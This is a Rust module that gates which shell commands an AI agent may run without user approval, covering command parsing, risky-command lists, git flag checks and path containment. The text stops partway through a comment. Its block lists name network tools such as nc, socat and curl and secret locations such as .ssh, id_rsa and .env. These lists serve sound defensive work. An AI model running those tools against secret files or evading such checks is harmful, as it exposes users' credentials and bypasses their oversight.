// SPDX-License-Identifier: MIT
// Copyright (c) 2026 Max Boksem

//! Which shell commands an agent may run without asking you, as Claude's
//! auto mode decides for its own.
//!
//! A command line is read the way a shell splits it, quotes and all, into
//! the commands its `&&`, `||`, `;`, `|` and newlines chain. Every one of
//! them has to pass, or you're asked. A line that could do something its
//! words don't show is always asked about: one with backticks or `$` outside
//! single quotes, except a `$` right before a closing double quote, an unquoted
//! `{`, `}` or `[`, process substitution, a heredoc or any `<`, `sudo` or `su`,
//! a leading `NAME=value`, a subshell, a background `&`, or output redirected
//! anywhere but `/dev/null` or another descriptor. So is an unquoted `*` or `?`
//! on a command with flags this refuses, since a file named as one of them
//! would become that flag.
//!
//! In Auto a command passes when it only reads, such as `ls`, `git show`
//! or `cargo test`, and its paths stay inside the agent's folders. In Ask,
//! Accept edits and Auto it passes when one of the project's rules names it.
//! "Always allow" saves a rule for the command and its subcommand, such as
//! `git show` from `git show 1a2b3c`. A command that deletes, moves,
//! overwrites, reaches the network, runs other code or publishes keeps its
//! exact words, so only that same command passes again. So does one that
//! reaches outside the folders.
//!
//! In every mode, a `cd` passes only inside the folders, and a path through a
//! name that holds secrets, such as `.ssh`, passes only under an exact rule.
//! This reads a path's words and doesn't follow a symlink inside the folders,
//! so a path it can't place asks.

use std::path::{Component, Path, PathBuf};

use maxhq_protocol::model::CommandRule;

/// Commands that only read, whatever their arguments.
const READERS: &[&str] = &[
    "ls", "pwd", "cat", "head", "tail", "wc", "grep", "egrep", "fgrep", "rg", "fd", "tree", "file",
    "stat", "du", "df", "which", "type", "echo", "printf", "sort", "uniq", "cut", "tr", "diff",
    "cmp", "basename", "dirname", "realpath", "readlink", "date", "whoami", "uname", "jq",
];

/// Readers with no flag that writes a file or runs anything, so a file named
/// as a flag can only change what they read or print when `*` or `?` expands.
const GLOB_SAFE: &[&str] = &[
    "ls", "pwd", "cat", "head", "wc", "grep", "egrep", "fgrep", "stat", "du", "df", "which",
    "type", "echo", "cut", "tr", "diff", "cmp", "basename", "dirname", "realpath", "readlink",
    "whoami", "uname",
];

/// Git subcommands that only read.
const GIT_READERS: &[&str] = &[
    "status",
    "log",
    "diff",
    "show",
    "blame",
    "rev-parse",
    "ls-files",
    "ls-tree",
    "grep",
    "describe",
    "shortlog",
    "cat-file",
    "merge-base",
    "for-each-ref",
];

/// Commands whose second word picks what they do, so a rule keeps both.
const WITH_SUBCOMMANDS: &[&str] = &[
    "git", "cargo", "go", "npm", "pnpm", "yarn", "bun", "gh", "pip", "pip3", "uv", "rustup",
    "deno", "brew", "make", "just", "swift", "dotnet", "poetry", "mix", "gradle", "mvn",
];

/// The package managers whose `run <script>` keeps the script's name too.
const SCRIPT_RUNNERS: &[&str] = &["npm", "pnpm", "yarn", "bun"];

/// Commands a rule keeps whole: they delete, move or overwrite, reach the
/// network or another machine, or run code their words don't show. The shell's
/// own words are here too, since `then` or `do` comes before another command,
/// and the rest change what later commands do.
const RISKY: &[&str] = &[
    "nc",
    "ncat",
    "socat",
    "telnet",
    "ftp",
    "tar",
    "zip",
    "unzip",
    "patch",
    "install",
    "vim",
    "nvim",
    "ed",
    "ex",
    "emacs",
    "crontab",
    "launchctl",
    "security",
    "gcc",
    "g++",
    "cc",
    "c++",
    "clang",
    "clang++",
    "!",
    "if",
    "then",
    "elif",
    "else",
    "fi",
    "for",
    "while",
    "until",
    "do",
    "done",
    "case",
    "esac",
    "select",
    "function",
    "coproc",
    "trap",
    "alias",
    "unalias",
    "unset",
    "export",
    "declare",
    "typeset",
    "readonly",
    "local",
    "set",
    "setopt",
    "shopt",
    "enable",
    "hash",
    "pushd",
    "popd",
    "rm",
    "rmdir",
    "mv",
    "cp",
    "ln",
    "chmod",
    "chown",
    "chgrp",
    "dd",
    "tee",
    "truncate",
    "shred",
    "kill",
    "pkill",
    "killall",
    "curl",
    "wget",
    "ssh",
    "scp",
    "sftp",
    "rsync",
    "docker",
    "kubectl",
    "awk",
    "gawk",
    "xargs",
    "env",
    "eval",
    "exec",
    "source",
    ".",
    "sh",
    "bash",
    "zsh",
    "dash",
    "fish",
    "ksh",
    "python",
    "python3",
    "node",
    "ruby",
    "perl",
    "php",
    "osascript",
    "open",
    "npx",
    "pnpx",
    "bunx",
    "nohup",
    "timeout",
    "nice",
    "time",
    "watch",
    "command",
    "builtin",
];

/// Subcommands of a tool with subcommands that a rule keeps whole: they
/// install, remove, publish or run other code.
const RISKY_SUBCOMMANDS: &[&str] = &[
    "install",
    "i",
    "add",
    "remove",
    "rm",
    "uninstall",
    "publish",
    "exec",
    "dlx",
    "x",
    "link",
    "unlink",
    "update",
    "upgrade",
    "up",
    "yank",
    "owner",
    "login",
    "logout",
    "global",
    "api",
];

/// Git subcommands a rule keeps whole: they rewrite or throw away work,
/// or push it.
const GIT_RISKY: &[&str] = &[
    "push",
    "reset",
    "clean",
    "checkout",
    "restore",
    "rebase",
    "switch",
    "filter-branch",
    "filter-repo",
    "update-ref",
    "reflog",
    "gc",
    "prune",
    "worktree",
    // These can run a command they're given, or one the repository names.
    "fetch",
    "pull",
    "clone",
    "ls-remote",
    "submodule",
    "bisect",
    "send-email",
    "hook",
    "difftool",
    "mergetool",
    "archive",
    "am",
    "apply",
    "merge",
    "cherry-pick",
    "update-index",
    "credential",
];

/// Git flags that write a file, open a pager they name, or run a program the
/// repository's config names.
const GIT_DENIED: &[&str] = &[
    "--output",
    "--open-files-in-pager",
    "-O",
    "--ext-diff",
    "--textconv",
    "--filters",
    "--show-signature",
];

/// sed's long flags that neither write a file nor read a script from one.
const SED_LONG: &[&str] = &[
    "--quiet",
    "--silent",
    "--regexp-extended",
    "--null-data",
    "--separate",
    "--unbuffered",
    "--sandbox",
    "--debug",
    "--posix",
];

/// Why a line is always asked about.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Refusal {
    /// It runs a command inside another: `$(`, backticks, `<(` or `>(`.
    Substitution,
    /// The shell would change its words first: a `$` it could expand, or an
    /// unquoted `{`, `}` or `[`.
    Expansion,
    /// It reads a heredoc or a file through `<`.
    Input,
    /// It writes its output to a file.
    Output,
    /// It runs as another user.
    OtherUser,
    /// It sets a variable for the command.
    Assignment,
    /// It runs a subshell or a background job.
    Grouping,
    /// Its quotes don't close.
    Unclosed,
    /// It has no command in it.
    Empty,
}

/// One command of a line, as its words.
type Part = Vec<String>;

/// One command of a line as the lexer read it.
struct Command {
    words: Part,
    /// The words with an unquoted `*` or `?`, which the shell expands.
    globs: Vec<usize>,
}

/// The folders an agent works in, which a command's paths are read against.
pub struct Folders {
    /// Where a line starts, which a path that climbs with `..` climbs from.
    from: PathBuf,
    /// Where a path may land, as the driver knows them and as they resolve.
    inside: Vec<PathBuf>,
}

impl Folders {
    /// The folders `cwd` and `attachments`. `local` says they're on this
    /// machine, so that a symlink on the way to them, such as `/tmp` on a Mac,
    /// resolves here. Elsewhere only their words count.
    pub fn new(cwd: &Path, attachments: &Path, local: bool) -> Self {
        let resolved = |path: &Path| local.then(|| std::fs::canonicalize(path).ok()).flatten();
        let mut inside = vec![cwd.to_owned(), attachments.to_owned()];
        inside.extend(resolved(cwd));
        inside.extend(resolved(attachments));
        // A relative folder would hold nothing the check can place.
        inside.retain(|folder| folder.is_absolute());
        Self {
            from: resolved(cwd).unwrap_or_else(|| cwd.to_owned()),
            inside,
        }
    }

    /// How far a command reaches. `moved` says an earlier `cd` on the line
    /// may have changed where it runs.
    fn reach(&self, command: &Command, moved: bool) -> Reach {
        let part = &command.words;
        if command.globs.iter().any(|at| !glob_is_clear(&part[*at])) {
            return Reach::Secret;
        }
        path_words(part)
            .into_iter()
            .map(|word| self.word_reach(word, moved))
            .max()
            .unwrap_or(Reach::Inside)
    }

    /// How far one word reaches, as a whole, after a flag's name and after
    /// each `=`, such as in `--file=/etc/passwd` or `-I/etc`.
    fn word_reach(&self, word: &str, moved: bool) -> Reach {
        word.split('=')
            .enumerate()
            .map(|(at, piece)| {
                let path = if at == 0 && word.starts_with('-') {
                    piece.trim_start_matches(|c: char| c == '-' || c.is_ascii_alphanumeric())
                } else {
                    piece
                };
                self.path_reach(path, moved)
            })
            .max()
            .unwrap_or(Reach::Inside)
    }

    /// How far one path reaches.
    fn path_reach(&self, path: &str, moved: bool) -> Reach {
        let parts = || Path::new(path).components();
        // Names on the way to a folder aren't the path's own.
        let own = self
            .inside
            .iter()
            .find_map(|folder| Path::new(path).strip_prefix(folder).ok())
            .unwrap_or(Path::new(path));
        let names = |test: fn(&str) -> bool| any_name(own, test);
        if names(holds_secrets) {
            return Reach::Secret;
        }
        let climbs = parts().any(|part| part == Component::ParentDir);
        if !climbs && !path.starts_with(['/', '~']) {
            return Reach::Inside;
        }
        // A `cd` that failed would leave `..` climbing from somewhere else.
        if !(moved && climbs) && self.holds(path) {
            return Reach::Inside;
        }
        if names(is_cli_home) {
            Reach::Secret
        } else {
            Reach::Outside
        }
    }

    /// Whether the agent may change `path` without asking: it lands inside the
    /// folders, off the files that decide what runs later and off names that hold
    /// secrets. A folder's own path doesn't count, as a workspace may live under
    /// `.claude/worktrees`.
    pub fn may_change(&self, path: &str) -> bool {
        let Some(at) = landing(path, &self.from) else {
            return false;
        };
        self.inside
            .iter()
            .find_map(|folder| at.strip_prefix(folder).ok())
            .is_some_and(|own| !any_name(own, decides_what_runs) && !any_name(own, holds_secrets))
    }

    /// Whether `path` lands inside the folders, as far as its words can tell.
    fn holds(&self, path: &str) -> bool {
        landing(path, &self.from)
            .is_some_and(|at| self.inside.iter().any(|folder| at.starts_with(folder)))
    }
}

/// How far a command's paths reach, the furthest last.
#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord)]
enum Reach {
    /// They stay inside the agent's folders.
    Inside,
    /// One lands outside them, or where it lands can't be told.
    Outside,
    /// One goes through a name that holds secrets, or a glob could match one.
    Secret,
}

/// Whether `line` may run without asking: in Auto when it only reads and stays
/// inside `folders`, and in any mode but Plan when the rules name every command
/// in it.
pub fn allows(line: &str, auto: bool, rules: &[CommandRule], folders: &Folders) -> bool {
    let Ok(commands) = read(line) else {
        return false;
    };
    let rules: Vec<(Part, bool)> = rules
        .iter()
        .filter_map(|rule| Some((words_of(&rule.command)?, rule.exact)))
        .collect();
    let mut moved = false;
    commands.iter().all(|command| {
        let part = &command.words;
        if is_cd(part) {
            let stays = cd_stays(command, folders, moved);
            moved = true;
            return stays;
        }
        if glob_matters(command) {
            return false;
        }
        let named = rules.iter().any(|rule| matches(rule, part));
        // You approved these words, wherever they reach.
        let exact = rules.iter().any(|(words, exact)| *exact && words == part);
        exact
            || match folders.reach(command, moved) {
                Reach::Inside => (auto && reads_only(part)) || named,
                // A plain command's rule covers it wherever it looks, outside
                // Auto. A rule for a project's tool covers only this project.
                Reach::Outside => !auto && !WITH_SUBCOMMANDS.contains(&part[0].as_str()) && named,
                Reach::Secret => false,
            }
    })
}

/// The rules "Always allow" saves for `line`: one for each of its
/// commands that doesn't pass on its own. None for a line that's always
/// asked about, and none for a `cd`, which no rule covers.
pub fn rules_for(line: &str, folders: &Folders) -> Vec<CommandRule> {
    let Ok(commands) = read(line) else {
        return Vec::new();
    };
    let mut rules: Vec<CommandRule> = Vec::new();
    let mut moved = false;
    for command in commands.iter().filter(|command| !glob_matters(command)) {
        let part = &command.words;
        if is_cd(part) {
            moved = true;
            continue;
        }
        let rule = if risky(part) || folders.reach(command, moved) != Reach::Inside {
            CommandRule {
                command: join(part),
                exact: true,
            }
        } else {
            CommandRule {
                command: join(&key(part)),
                exact: false,
            }
        };
        if !rules.contains(&rule) {
            rules.push(rule);
        }
    }
    rules
}

/// Whether what "Always allow" saves for `line` covers all of it next time. It
/// can't for a line that's always asked about, a `cd` that leaves the folders or
/// a glob that could turn into a flag, so those aren't offered the choice.
pub fn always_allow_holds(line: &str, folders: &Folders) -> bool {
    allows(line, false, &rules_for(line, folders), folders)
}

/// Whether `rule`, as its words and whether it's exact, names `part`.
fn matches((words, exact): &(Part, bool), part: &Part) -> bool {
    if *exact {
        words == part
    } else {
        !risky(part) && *words == key(part)
    }
}

/// A rule's command back as words, or none for one that doesn't read as
/// a single command.
fn words_of(command: &str) -> Option<Part> {
    let mut parts = split(command).ok()?;
    (parts.len() == 1).then(|| parts.remove(0))
}

/// Whether an unquoted `*` or `?` could turn into a flag this refuses.
fn glob_matters(command: &Command) -> bool {
    let Some(program) = command.words.first().map(String::as_str) else {
        return false;
    };
    !command.globs.is_empty()
        && !GLOB_SAFE.contains(&program)
        && (READERS.contains(&program)
            || WITH_SUBCOMMANDS.contains(&program)
            || matches!(program, "find" | "sed" | "pytest" | "tsc"))
}

/// `cd` changes nothing on its own, but what follows it runs where it landed.
fn is_cd(part: &Part) -> bool {
    part.first().is_some_and(|word| word == "cd")
}

/// Whether a `cd` stays inside the folders. One with no folder, one back to
/// the last folder, one with flags and one with a glob can land anywhere.
fn cd_stays(command: &Command, folders: &Folders, moved: bool) -> bool {
    match command.words.as_slice() {
        [_, target] => {
            !target.starts_with('-')
                && command.globs.is_empty()
                && folders.word_reach(target, moved) == Reach::Inside
        }
        _ => false,
    }
}

/// Where `path` lands from `from`, or none when its words can't tell: it starts
/// at a home folder, or it climbs after a folder it names, which a symlink
/// could send anywhere.
fn landing(path: &str, from: &Path) -> Option<PathBuf> {
    if path.starts_with('~') {
        return None;
    }
    let mut at = from.to_owned();
    let mut named = false;
    for part in Path::new(path).components() {
        match part {
            Component::Prefix(_) | Component::RootDir => at.push(part),
            Component::CurDir => {}
            Component::ParentDir => {
                if named || !at.pop() {
                    return None;
                }
            }
            Component::Normal(name) => {
                named = true;
                at.push(name);
            }
        }
    }
    Some(at)
}

/// Whether `test` holds for any of `path`'s names, lower-cased.
fn any_name(path: &Path, test: fn(&str) -> bool) -> bool {
    path.components().any(|part| match part {
        Component::Normal(name) => test(&name.to_string_lossy().to_ascii_lowercase()),
        _ => false,
    })
}

/// Whether a lower-cased name holds keys or tokens.
fn holds_secrets(name: &str) -> bool {
    matches!(
        name,
        ".ssh"
            | ".aws"
            | ".gnupg"
            | ".netrc"
            | ".kube"
            | ".docker"
            | ".git-credentials"
            | ".pgpass"
            | ".npmrc"
            | ".pypirc"
            | "keychains"
            | "credentials"
            | "credentials.json"
    ) || name.starts_with(".env")
        || ["id_rsa", "id_ed25519", "id_ecdsa", "id_dsa"]
            .iter()
            .any(|key| name.starts_with(key))
        || name.ends_with(".pem")
}

/// Whether a lower-cased name is where a CLI keeps its sign-in. Inside the
/// folders it's the project's own settings.
fn is_cli_home(name: &str) -> bool {
    matches!(name, ".claude" | ".codex" | ".cursor")
}

/// Whether a lower-cased name holds what a CLI, git or a shell loads and runs
/// later, with no prompt of its own. All of `.git` counts, since a worktree's
/// `.git` file and a submodule's hooks do this as well.
fn decides_what_runs(name: &str) -> bool {
    is_cli_home(name)
        || matches!(
            name,
            ".mcp.json"
                | ".maxhq"
                | ".git"
                | ".zshrc"
                | ".zshenv"
                | ".zprofile"
                | ".zlogin"
                | ".zlogout"
                | ".bashrc"
                | ".bash_profile"
                | ".bash_login"
                | ".bash_logout"
                | ".profile"
        )
}

/// Whether a word's unquoted `*` and `?` can't match a name that holds secrets:
/// each folder or file name with one must not be hidden, and has to end in a
/// plain extension it spells out, as in `src/*.rs` or `*_test.rs`.
fn glob_is_clear(word: &str) -> bool {
    Path::new(word).components().all(|part| {
        let Component::Normal(name) = part else {
            return true;
        };
        let name = name.to_string_lossy().to_ascii_lowercase();
        let Some(last) = name.rfind(['*', '?']) else {
            return true;
        };
        let tail = &name[last + 1..];
        !name.starts_with('.')
            && !tail.ends_with(".pem")
            && tail.rfind('.').is_some_and(|dot| dot + 1 < tail.len())
    })
}

/// The arguments of `part` that can name files or folders. A pattern or a
/// script isn't one, and some commands take no paths at all.
fn path_words(part: &Part) -> Vec<&str> {
    const SEARCH_INPUTS: &[&str] = &["-e", "-f", "--file", "--files", "--regexp"];
    let args = part.get(1..).unwrap_or(&[]);
    let without = |first: Option<usize>| {
        let rest = args
            .iter()
            .enumerate()
            .filter(move |(at, _)| Some(*at) != first);
        rest.map(|(_, arg)| arg.as_str()).collect()
    };
    match part.first().map(String::as_str) {
        Some("echo" | "printf" | "tr" | "basename" | "dirname") => Vec::new(),
        Some("jq") => without(args.iter().position(|arg| !arg.starts_with('-'))),
        // With these flags, every plain word is a file to search.
        Some("grep" | "egrep" | "fgrep" | "rg")
            if !args.iter().any(|arg| names_flag(arg, SEARCH_INPUTS)) =>
        {
            without(first_plain(args))
        }
        Some("sed") => sed_words(args).map_or_else(
            || args.iter().map(String::as_str).collect(),
            |(_, files)| files,
        ),
        _ => (1..part.len())
            .filter(|at| !is_term(part, *at))
            .map(|at| part[at].as_str())
            .collect(),
    }
}

/// Where the first word of `args` sits that isn't a flag or a flag's count, as
/// in `rg -A 3 foo`.
fn first_plain(args: &[String]) -> Option<usize> {
    const COUNTS: &[&str] = &[
        "-A",
        "-B",
        "-C",
        "-m",
        "--after-context",
        "--before-context",
        "--context",
        "--max-count",
    ];
    let mut at = 0;
    while let Some(arg) = args.get(at) {
        if arg == "--" {
            return (at + 1 < args.len()).then_some(at + 1);
        }
        if !arg.starts_with('-') {
            return Some(at);
        }
        let counted = COUNTS.contains(&arg.as_str())
            && args
                .get(at + 1)
                .is_some_and(|next| next.bytes().all(|byte| byte.is_ascii_digit()));
        at += if counted { 2 } else { 1 };
    }
    None
}

/// Whether the word at `at` in `part` is what a search looks for or a test's
/// filter, which names no file: the pattern of `git grep`, the value of a flag
/// such as `--grep` or `-k`, or a bare word after `cargo test` or `pnpm test`. A
/// word with a `/` or a leading `.` or `~` still counts as a path there, as does
/// one right after a flag, which may be that flag's value, and what `git grep -f`
/// reads.
fn is_term(part: &Part, at: usize) -> bool {
    const LOG_TERMS: &[&str] = &["--grep", "--author", "--committer", "-S", "-G"];
    const NAME_TERMS: &[&str] = &[
        "-name",
        "-iname",
        "-path",
        "-ipath",
        "-wholename",
        "-iwholename",
        "-regex",
        "-iregex",
    ];
    let word = part[at].as_str();
    let after = |flags: &[&str]| flags.contains(&part[at - 1].as_str());
    let rest = after_globals(part);
    let sub_at = part.len() - rest.len();
    match (part[0].as_str(), rest.first().map(String::as_str)) {
        ("git", Some("grep")) => {
            let args = &part[sub_at + 1..];
            !args.iter().any(|arg| names_flag(arg, &["-f", "--file"]))
                && first_plain(args).map(|first| first + sub_at + 1) == Some(at)
        }
        ("git", Some("log")) => {
            after(LOG_TERMS)
                || word
                    .split_once('=')
                    .is_some_and(|(name, _)| LOG_TERMS.contains(&name))
        }
        ("cargo" | "npm" | "pnpm" | "yarn" | "bun", Some("test")) => {
            at > sub_at
                && !part[at - 1].starts_with('-')
                && !word.starts_with(['-', '.', '~'])
                && !word.contains('/')
        }
        ("go", Some("test")) => after(&["-run", "-skip"]),
        ("pytest", _) => after(&["-k", "-m"]),
        ("find", _) => after(NAME_TERMS),
        _ => false,
    }
}

/// The words a rule for `part` keeps: the command, its subcommand when it
/// has them, and the script a package manager's `run` runs.
fn key(part: &Part) -> Part {
    let Some(command) = part.first() else {
        return Vec::new();
    };
    let mut key = vec![command.clone()];
    if !WITH_SUBCOMMANDS.contains(&command.as_str()) {
        return key;
    }
    let rest = after_globals(part);
    let Some(sub) = rest.first().filter(|word| !word.starts_with('-')) else {
        return key;
    };
    key.push(sub.clone());
    let runs_script = SCRIPT_RUNNERS.contains(&command.as_str()) && sub == "run";
    let three = runs_script || command == "gh";
    if three && let Some(next) = rest.get(1).filter(|word| !word.starts_with('-')) {
        key.push(next.clone());
    }
    key
}

/// The words after a command's own options that come before its
/// subcommand, such as git's `-C <path>` or cargo's `+toolchain`.
fn after_globals(part: &Part) -> &[String] {
    let Some(command) = part.first() else {
        return &[];
    };
    let mut rest = &part[1..];
    loop {
        let Some(word) = rest.first() else {
            return rest;
        };
        let takes_value = match command.as_str() {
            "git" => match word.as_str() {
                "-C" => true,
                "--no-pager" => false,
                _ => return rest,
            },
            "cargo" if word.starts_with('+') => false,
            "npm" | "pnpm" | "yarn" | "bun" => match word.as_str() {
                "-C" | "--dir" | "--filter" | "-F" | "--prefix" | "-w" | "--workspace"
                | "--cwd" => true,
                "-r" | "--recursive" | "-s" | "--silent" => false,
                _ => return rest,
            },
            _ => return rest,
        };
        let skip = if takes_value { 2 } else { 1 };
        rest = rest.get(skip..).unwrap_or(&[]);
    }
}

/// Whether a rule for `part` has to keep its exact words.
fn risky(part: &Part) -> bool {
    let Some(command) = part.first().map(String::as_str) else {
        return true;
    };
    // A program written as a path could be anything, and a Mac's file system
    // finds `RM` for `rm`.
    if RISKY.contains(&command)
        || command.contains('/')
        || command.chars().any(|c| c.is_ascii_uppercase())
        || part.iter().any(|word| word == "publish")
        || loads_code(command, &part[1..])
    {
        return true;
    }
    match command {
        // The checks that make these read only decide whether they are.
        "find" | "sed" => !reads_only(part),
        _ if READERS.contains(&command) => !reads_only(part),
        "git" => git_risky(part),
        _ if WITH_SUBCOMMANDS.contains(&command) => {
            after_globals(part).first().is_some_and(|sub| {
                RISKY_SUBCOMMANDS.contains(&sub.as_str()) || runs_what_it_names(command, sub)
            })
        }
        _ => false,
    }
}

/// Whether a tool's subcommand runs whatever it's given. A package manager's
/// `run` isn't one, as it runs a script the project named.
fn runs_what_it_names(command: &str, sub: &str) -> bool {
    matches!(
        (command, sub),
        (
            "cargo" | "go" | "uv" | "poetry" | "deno" | "swift" | "dotnet" | "mix" | "rustup",
            "run"
        ) | ("uv", "pip" | "tool")
            | ("deno", "eval")
            | ("go", "generate" | "tool")
            | ("npm", "config" | "ci")
    )
}

/// Whether a git command rewrites, throws away or pushes work, or reads
/// options its words don't show.
fn git_risky(part: &Part) -> bool {
    let rest = after_globals(part);
    let Some(sub) = rest.first() else {
        return false;
    };
    if sub.starts_with('-') || GIT_RISKY.contains(&sub.as_str()) {
        return true;
    }
    // What these do turns on their flags, so only their listing forms
    // are kept loose.
    match sub.as_str() {
        "branch" | "tag" | "remote" | "stash" | "config" => !git_reads(rest),
        // A reading one that writes a file or opens a pager.
        sub if GIT_READERS.contains(&sub) => !reads_only(part),
        _ => false,
    }
}

/// Whether `part` only reads, which is all Auto runs without a rule.
fn reads_only(part: &Part) -> bool {
    let Some(command) = part.first().map(String::as_str) else {
        return false;
    };
    let args = &part[1..];
    match command {
        "find" => !args.iter().any(|arg| {
            matches!(
                arg.as_str(),
                "-exec" | "-execdir" | "-ok" | "-okdir" | "-delete"
            ) || arg.starts_with("-fprint")
                || arg.starts_with("-fls")
        }),
        "sed" => sed_reads(args),
        "git" => {
            let rest = after_globals(part);
            let denied = rest.iter().any(|arg| names_flag(arg, GIT_DENIED));
            !denied && git_reads(rest)
        }
        "cargo" => !loads_code(command, args) && cargo_checks(after_globals(part)),
        "go" => {
            !loads_code(command, args)
                && args
                    .first()
                    .is_some_and(|sub| matches!(sub.as_str(), "build" | "test" | "vet"))
        }
        "pytest" => !loads_code(command, args),
        "tsc" => args.iter().any(|arg| arg == "--noEmit"),
        "npm" | "pnpm" | "yarn" | "bun" => {
            !loads_code(command, args) && script_checks(after_globals(part))
        }
        _ => READERS.contains(&command) && !reader_writes(command, args),
    }
}

/// Whether one of the reading commands is asked, through its arguments,
/// to write a file or run another command.
fn reader_writes(command: &str, args: &[String]) -> bool {
    let any = |flags: &[&str]| args.iter().any(|arg| names_flag(arg, flags));
    match command {
        // `sort -o` and `tree -o` write their output to a file, and
        // `sort --compress-program` runs a program on it.
        "sort" => any(&["-o", "--output", "--compress-program"]),
        "tree" => any(&["-o", "-R"]),
        // A second file names where `uniq` writes. `-` is the first file, and
        // anything after `--` is a file whatever it looks like.
        "uniq" => {
            let flags = args.iter().position(|arg| arg == "--");
            let before = &args[..flags.unwrap_or(args.len())];
            let after = flags.map_or(0, |at| args.len() - at - 1);
            let files = before
                .iter()
                .filter(|arg| *arg == "-" || !arg.starts_with('-'))
                .count();
            files + after > 1
        }
        // `rg --pre`, `rg --hostname-bin` and `fd -x` run a command they name.
        "rg" => any(&["--pre", "--hostname-bin"]),
        "fd" => any(&["-x", "--exec", "-X", "--exec-batch"]),
        "date" => any(&["-s", "--set"]),
        // `printf -v` sets a shell variable, such as `PATH`.
        "printf" => any(&["-v"]),
        // These load a program or a library from a file.
        "jq" => any(&["-f", "--from-file", "-L", "--library-path"]),
        "file" => any(&["-C", "--compile"]),
        // `tail -f` never ends.
        "tail" => any(&["-f", "-F", "--follow"]),
        _ => false,
    }
}

/// Whether `arg` names one of the `denied` flags the way option parsers read
/// them: a long flag by any shorter form of its name, with or without a
/// value, and a short flag anywhere in a run of them, such as `-ro`.
fn names_flag(arg: &str, denied: &[&str]) -> bool {
    if let Some(long) = arg.strip_prefix("--") {
        let name = long.split('=').next().unwrap_or(long);
        return !name.is_empty()
            && denied
                .iter()
                .filter_map(|flag| flag.strip_prefix("--"))
                .any(|flag| flag.starts_with(name));
    }
    let Some(short) = arg.strip_prefix('-') else {
        return false;
    };
    denied
        .iter()
        .filter(|flag| !flag.starts_with("--"))
        .filter_map(|flag| flag.strip_prefix('-'))
        .any(|letter| short.contains(letter))
}

/// Whether a project's check is told, through a flag, to load or run
/// something besides the project's own code. A rule for the check doesn't
/// cover these.
fn loads_code(command: &str, args: &[String]) -> bool {
    const SCRIPT_FLAGS: &[&str] = &[
        "--script-shell",
        "--node-options",
        "--userconfig",
        "--globalconfig",
        "--use-yarnrc",
        "--preload",
        "--config",
    ];
    let any = |flags: &[&str]| args.iter().any(|arg| names_flag(arg, flags));
    match command {
        "cargo" => any(&["--config"]),
        // A variable on make's line can name the shell or any tool its recipes
        // run, and these read another makefile or more of one.
        "make" => {
            args.iter().any(|arg| arg.contains('='))
                || any(&["-f", "--file", "--makefile", "--eval"])
        }
        // Go reads `-name` and `--name` the same, and has no short flags.
        "go" => args.iter().any(|arg| {
            let name = arg.trim_start_matches('-').split('=').next();
            arg.starts_with('-')
                && name.is_some_and(|name| {
                    matches!(
                        name,
                        "exec" | "toolexec" | "vettool" | "ldflags" | "overlay" | "modfile"
                    )
                })
        }),
        // `--basetemp` empties the folder it names, and `--pastebin` sends
        // the output away.
        "pytest" => any(&[
            "-p",
            "-c",
            "-o",
            "--config-file",
            "--override-ini",
            "--pastebin",
            "--basetemp",
        ]),
        "npm" | "pnpm" | "yarn" | "bun" => {
            any(SCRIPT_FLAGS)
                || args.iter().any(|arg| arg.starts_with("--config"))
                || (command == "bun" && any(&["-r"]))
        }
        _ => false,
    }
}

/// Whether a git command, from its subcommand on, only reads.
fn git_reads(rest: &[String]) -> bool {
    let Some(sub) = rest.first() else {
        return false;
    };
    let args = &rest[1..];
    match sub.as_str() {
        "branch" => listing(
            args,
            &[
                "--list",
                "-l",
                "-a",
                "--all",
                "-r",
                "--remotes",
                "-v",
                "-vv",
                "--verbose",
                "--show-current",
            ],
            &["--contains", "--merged"],
            false,
        ),
        "tag" => {
            let lists = args.iter().any(|arg| arg == "-l" || arg == "--list");
            listing(args, &["-l", "--list"], &[], lists)
        }
        "remote" => match args.first().map(String::as_str) {
            None | Some("-v" | "--verbose") => args.len() <= 1,
            Some("get-url") => args.len() == 2,
            Some(_) => false,
        },
        "stash" => args.first().is_some_and(|arg| arg == "list"),
        "config" => {
            let gets = args.iter().any(|arg| arg == "--get");
            let lists = args.iter().any(|arg| arg == "--list" || arg == "-l");
            let scopes = ["--get", "--list", "-l", "--global", "--local", "--system"];
            let positional = args.iter().filter(|arg| !arg.starts_with('-')).count();
            let flags_ok = args
                .iter()
                .filter(|arg| arg.starts_with('-'))
                .all(|arg| scopes.contains(&arg.as_str()));
            flags_ok && ((gets && (1..=2).contains(&positional)) || (lists && positional == 0))
        }
        sub => GIT_READERS.contains(&sub),
    }
}

/// Whether `args` hold only the listing `flags`, the values of the
/// `with_value` flags, and other words only when `free` says so.
fn listing(args: &[String], flags: &[&str], with_value: &[&str], free: bool) -> bool {
    let mut after_value_flag = false;
    for arg in args {
        let ok = if arg.starts_with('-') {
            flags.contains(&arg.as_str()) || with_value.contains(&arg.as_str())
        } else {
            free || after_value_flag
        };
        if !ok {
            return false;
        }
        after_value_flag = with_value.contains(&arg.as_str());
    }
    true
}

/// Whether a sed command only prints: only flags known to change nothing,
/// and a script that only prints. A flag it doesn't know counts as writing.
fn sed_reads(args: &[String]) -> bool {
    sed_words(args)
        .is_some_and(|(scripts, _)| scripts.iter().all(|script| sed_script_reads(script)))
}

/// A sed command's scripts and files, or none when it has a flag not known to
/// change nothing. Its first plain word is a script only when no flag gives one.
fn sed_words(args: &[String]) -> Option<(Vec<&str>, Vec<&str>)> {
    let mut scripts: Vec<&str> = Vec::new();
    let mut plain: Vec<&str> = Vec::new();
    let mut next_is_script = false;
    for arg in args {
        if next_is_script {
            scripts.push(arg);
            next_is_script = false;
            continue;
        }
        match arg.as_str() {
            "--expression" => next_is_script = true,
            arg if arg.starts_with("--expression=") => {
                scripts.push(&arg["--expression=".len()..]);
            }
            arg if arg.starts_with("--") => {
                if !SED_LONG.contains(&arg) {
                    return None;
                }
            }
            // Short flags run together, such as `-nE`. An `e` takes the next
            // word as its script only when it comes last, and anything after
            // it would be a script this can't see apart from the flags.
            arg if arg.starts_with('-') && arg.len() > 1 => {
                let letters = &arg[1..];
                let plain = letters.strip_suffix('e');
                next_is_script = plain.is_some();
                if !plain
                    .unwrap_or(letters)
                    .chars()
                    .all(|c| "nErsuz".contains(c))
                {
                    return None;
                }
            }
            arg => plain.push(arg),
        }
    }
    if scripts.is_empty() && !plain.is_empty() {
        scripts.push(plain.remove(0));
    }
    Some((scripts, plain))
}

/// Whether a sed script holds only commands that print or move through the
/// input, and no `w` or `e` flag on an `s` command. It errs on the safe side:
/// outside a `/regex/` address, a label and an `s` or `y` command's own text,
